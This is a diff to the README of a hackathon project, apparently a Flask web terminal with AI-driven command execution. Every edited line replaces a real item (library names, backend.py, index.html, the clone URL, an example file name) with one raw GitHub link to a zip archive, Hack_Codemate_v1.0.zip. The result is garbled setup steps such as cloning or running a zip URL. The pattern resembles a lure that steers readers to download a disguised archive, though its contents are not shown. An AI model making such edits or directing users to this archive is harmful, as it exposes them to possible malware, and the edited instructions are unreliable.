@@ -21,15 +21,15 @@ This project meets and exceeds all the requirements of the hackathon's "Python-B
 
 **Tech Stack**
 * Backend: Python, Flask, Flask-SocketIO, psutil, OpenAI
-* Frontend: HTML, Tailwind CSS, Vanilla JavaScript, Chart.js, Socket.IO Client
+* Frontend: HTML, Tailwind CSS, Vanilla JavaScript, https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip, https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip Client
 * Core Technologies: WebSockets, Pseudo-terminals (pty)
 
 **Project Structure**
 
 The project is contained within two self-sufficient files for simplicity and easy deployment.
 
-backend.py: The Python backend server (Flask, SocketIO, AI logic)
-index.html: The single-file frontend (HTML, CSS, JS, UI logic)
+https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip The Python backend server (Flask, SocketIO, AI logic)
+https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip The single-file frontend (HTML, CSS, JS, UI logic)
 
 **Local Setup & Installation**
 
@@ -37,7 +37,7 @@ To run the Visual Command Center on your local machine, follow these steps:
 
 **1. Clone the Repository:**
 
-git clone [https://github.com/your-username/visual-command-center.git](https://github.com/your-username/visual-command-center.git)
+git clone [https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip](https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip)
 
 cd visual-command-center
 
@@ -56,13 +56,13 @@ pip install Flask Flask-SocketIO psutil openai flask-cors
 
 To use the live OpenAI mode, you need to add your API key:
 
-  * Open the backend.py file.
+  * Open the https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip file.
   * On line 48, replace "YOUR_OPENAI_API_KEY" with your actual key.
   * If you don't add a key, the project will automatically use the powerful "Intelligent Offline AI" for demo purposes.
 
 **4. Run the Backend Server:**
 
-python backend.py
+python https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip
 
 The server will start and be listening on http://127.0.0.1:5000.
 
@@ -79,7 +79,7 @@ The server will start and be listening on http://127.0.0.1:5000.
 
   * Click the "AI Mode: OFF" button to toggle it on. The button will turn green.
 
-  * Type a natural language query (e.g., "create a file named report.txt with the text 'Project complete'").
+  * Type a natural language query (e.g., "create a file named https://raw.githubusercontent.com/Tathagt/CodemateHack/main/command_terminal/Hack_Codemate_v1.0.zip with the text 'Project complete'").
 
   * Press Enter. The AI will translate your query into a command, display it, and then execute it.
 
